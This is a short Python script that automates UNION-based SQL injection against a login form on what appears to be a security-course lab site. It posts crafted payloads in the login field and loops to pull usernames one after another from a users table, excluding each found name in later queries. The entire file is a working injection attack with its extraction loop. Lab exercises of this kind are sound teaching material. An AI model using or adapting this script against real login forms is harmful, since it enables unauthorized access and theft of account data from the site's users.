import requests as rq
import re
url = "http://enter.seclab.stepic.org/area51/sezam.php"

sql_start = "ads' union select id,password from users where username not like 'admin'"
sql_end = "#"
sql_add = " and username not like '%s'"

pwd = "asd"

login = sql_start
while(True):
  res = rq.post(url, data = {"login":login+sql_end,"pwd":pwd})
  try:
    out = re.findall("<b>name:</b> (\w+)<br>",res.text)[0]
  except:
    break
  login+=sql_add%(out)
  print(out)